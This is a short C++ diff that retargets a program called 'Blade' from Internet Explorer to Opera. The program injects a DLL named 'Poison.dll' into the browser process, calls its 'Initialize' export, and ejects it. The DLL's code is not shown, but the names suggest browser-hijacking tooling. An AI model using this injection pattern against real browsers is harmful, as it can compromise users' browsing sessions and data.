@@ -9,15 +9,15 @@ int main()
 
 	Logger::Instance->Log("Blade is starting.");
 
-	injector->Inject("iexplore", "Poison.dll");
+	injector->Inject("opera", "Poison.dll");
 
 	Thread::Sleep(1000);
 
-	injector->CallExport("iexplore", "Poison.dll", "Initialize");
+	injector->CallExport("opera", "Poison.dll", "Initialize");
 
 	Thread::Sleep(1000);
 
-	injector->Eject("iexplore", "Poison.dll");
+	injector->Eject("opera", "Poison.dll");
 
 	Logger::Instance->Log("Blade is closing.");
 	return 0;
